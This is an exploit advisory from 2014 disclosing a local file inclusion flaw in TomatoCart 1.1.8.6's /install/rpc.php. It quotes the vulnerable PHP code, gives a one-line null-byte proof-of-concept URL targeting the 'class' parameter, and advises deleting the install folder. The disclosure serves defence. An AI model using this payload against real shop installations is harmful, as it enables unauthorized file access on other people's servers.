[+] Exploit Title: TomatoCart 1.1.8.6 Local File Inclusion Vulnerability
[+] Date: 14-02-2014
[+] Category: WebApp
[+] Tested on: KaliLinux
[+] Vendor: http://www.tomatocart.com/
[+] Friendly Sites: na3il.com,th3-creative.com

1.OVERVIEW:
TomatoCart 1.1.8.6 (old versions too) suffers from a LFI Vulnerability.
More Info about LFI:
https://www.netsparker.com/local-file-inclusion/

2.Background:
TomatoCart is open source ecommerce solution developed and maintained by a number of 64,000+ users from 50+ countries and regions. 
It&#039;s distributed under the terms of the GNU General Public License (or "GPL"), 
free to download and share. 
The community, including project founders and other developers, 
are supposed to work together on the platform of TomatoCart, contributing features, technical support and services.
http://www.tomatocart.com/about-us/about-tomatocart.html

3.Vulnerability:
File : /install/rpc.php Lines:21--->44
[PHP]
if (isset($_GET[&#039;action&#039;]) && !empty($_GET[&#039;action&#039;])) {
    switch ($_GET[&#039;action&#039;]) {
      case &#039;dbCheck&#039;:
        $db = array(&#039;DB_SERVER&#039; => trim(urldecode($_GET[&#039;server&#039;])),
                    &#039;DB_SERVER_USERNAME&#039; => trim(urldecode($_GET[&#039;username&#039;])),
                    &#039;DB_SERVER_PASSWORD&#039; => trim(urldecode($_GET[&#039;password&#039;])),
                    &#039;DB_DATABASE&#039; => trim(urldecode($_GET[&#039;name&#039;])),
                    &#039;DB_DATABASE_CLASS&#039; => trim(urldecode($_GET[&#039;class&#039;]))
                   );

        $osC_Database = osC_Database::connect($db[&#039;DB_SERVER&#039;], $db[&#039;DB_SERVER_USERNAME&#039;], $db[&#039;DB_SERVER_PASSWORD&#039;], $db[&#039;DB_DATABASE_CLASS&#039;]);

        if ($osC_Database->isError() === false) {
          $osC_Database->selectDatabase($db[&#039;DB_DATABASE&#039;]);
        }

        if ($osC_Database->isError()) {
          echo &#039;[[0|&#039; . $osC_Database->getError() . &#039;]]&#039;;
        } else {
          echo &#039;[[1]]&#039;;
        }

        exit;
        break;
[PHP]

4.Proof Of Concept:
127.0.0.1/install/rpc.php?action=dbCheck&class=LFI%00

5.Solution(s):
No Patch was released.
Delete "/install/" Folder.
Use another ShoppingApplication.

6.TIME-LINE:
2014-02-13: Vulnerability was discovered.
2014-02-13: Contact with vendor.
2014-02-14: No Reply
2014-02-14: Vulnerability Released

7.Greetings:
Xmax-tn
Xtech-set
N43il
Sec4ver,E4A Members

